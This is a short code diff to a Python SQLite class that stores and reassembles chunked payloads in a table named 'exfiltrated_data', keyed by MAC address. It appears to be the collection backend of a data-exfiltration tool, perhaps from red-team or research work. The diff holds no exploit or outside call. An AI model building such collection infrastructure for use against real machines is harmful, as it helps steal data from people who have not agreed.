@@ -30,7 +30,7 @@ class Database:
         self.cursor.execute(
             '''CREATE TABLE IF NOT EXISTS exfiltrated_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                mac_address INTEGER,
+                mac_address VARCHAR(12),
                 payload_id INTEGER,
                 sequence_number INTEGER,
                 payload BLOB)
@@ -58,13 +58,15 @@ class Database:
             (mac_address,))
         return [entry for entry in self.cursor]
 
-    def get_payload(self, mac_address, payload_id):
+    def get_payload_chunks(self, mac_address, payload_id):
         self.cursor.execute(
-            '''SELECT * FROM exfiltrated_data
-            WHERE mac_address=? AND payload_id=?
+            '''SELECT payload FROM exfiltrated_data
+            WHERE mac_address=?
+            AND payload_id=?
+            AND sequence_number > 1
             ORDER BY sequence_number ASC''',
             (mac_address, payload_id))
-        return [entry[1:] for entry in self.cursor]
+        return [entry[0] for entry in self.cursor]
 
     def close(self):
         self.connection.close()
